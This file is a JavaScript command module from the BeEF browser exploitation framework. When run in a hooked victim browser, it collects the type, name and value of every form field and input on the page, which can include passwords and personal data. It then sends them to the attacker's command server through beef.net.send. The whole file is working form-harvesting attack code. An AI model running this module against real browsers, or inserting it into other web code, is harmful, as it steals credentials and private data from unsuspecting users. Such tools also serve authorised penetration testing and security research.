//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var input_values = new Array();

	// loop through all forms
	var forms = document.forms;
	for (var f=0; f < forms.length; f++) {
		// store type,name,value for all input fields
		for (var i=0; i < forms[f].elements.length; i++) {
			input_values.push(new Array(forms[f].elements[i].type, forms[f].elements[i].name, forms[f].elements[i].value));
		}
	}

	// store type,name,value for all input fields outside of form elements
	var inputs = document.getElementsByTagName('input');
	for (var i=0; i < inputs.length; i++) {
		input_values.push(new Array(inputs[i].type, inputs[i].name, inputs[i].value))
	}

	// return input field info
	if (input_values.length) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+JSON.stringify(input_values.unique()));
	// return if no input fields were found
	} else {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'error=Could not find any inputs fields on '+window.location);
	}

});

